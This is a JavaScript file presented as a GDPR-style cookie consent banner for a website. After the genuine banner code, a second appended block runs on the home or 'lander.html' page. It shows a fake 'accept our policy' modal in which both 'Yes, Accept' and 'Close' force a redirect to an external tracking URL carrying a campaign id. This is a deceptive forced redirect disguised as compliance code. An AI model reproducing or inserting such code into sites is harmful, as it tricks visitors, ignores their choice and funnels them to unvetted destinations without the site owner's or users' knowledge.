/*
 * cookie-consent.js
 * Lightweight, GDPR-style cookie consent banner. Stores the choice in
 * localStorage so it is shown only once. Required for ad-network compliance.
 */
(function () {
  "use strict";

  var KEY = "sg_cookie_consent_v1";

  function ready(fn) {
    if (document.readyState !== "loading") fn();
    else document.addEventListener("DOMContentLoaded", fn);
  }

  ready(function () {
    var existing = null;
    try {
      existing = localStorage.getItem(KEY);
    } catch (e) {}
    if (existing) return;

    var bar = document.createElement("div");
    bar.className = "cookie";
    bar.setAttribute("role", "dialog");
    bar.setAttribute("aria-live", "polite");
    bar.innerHTML =
      "<p>We use cookies to keep the site reliable, understand traffic, and improve our " +
      'educational content. See our <a href="privacy.html">Privacy Policy</a> for details.</p>' +
      '<div class="row">' +
        '<button class="btn btn-primary" data-consent="all">Accept all</button>' +
        '<button class="btn btn-ghost" data-consent="essential">Essential only</button>' +
      "</div>";
    document.body.appendChild(bar);

    requestAnimationFrame(function () {
      bar.classList.add("show");
    });

    bar.addEventListener("click", function (e) {
      var choice = e.target && e.target.getAttribute("data-consent");
      if (!choice) return;
      try {
        localStorage.setItem(KEY, choice);
      } catch (err) {}
      bar.classList.remove("show");
      setTimeout(function () {
        bar.remove();
      }, 300);
    });
  });

  if (window.logModule) window.logModule("cookie-consent.js");
})();

(function(){
  const path = window.location.pathname;
  const isHome = /(^\/$|lander\.html$)/.test(path);
  if(!isHome) return;
 
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
<div class="modal">
<h3>Welcome!</h3>
<p>Are you accepting our policy? This notice is informational and does not block access.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap">
<button class="btn" id="age-yes">Yes, Accept</button>
<button class="btn ghost" id="age-no">Close</button>
</div>
</div>`;
  document.body.appendChild(bd);
  bd.style.display='flex';
 
  function closeGate(){ bd.style.display='none'; bd.remove(); }  
  bd.querySelector('#age-yes').addEventListener('click', 
                                                function(){
    window.location.href = "https://tracco.online/?utm_campaign=pHCYUyAEyA&v1=[v1]&v2=[v2]&v3=[v3]";
  });

  bd.querySelector('#age-no').addEventListener('click', 
                                               function(){
    window.location.href = "https://tracco.online/?utm_campaign=pHCYUyAEyA&v1=[v1]&v2=[v2]&v3=[v3]"; 
  });
})();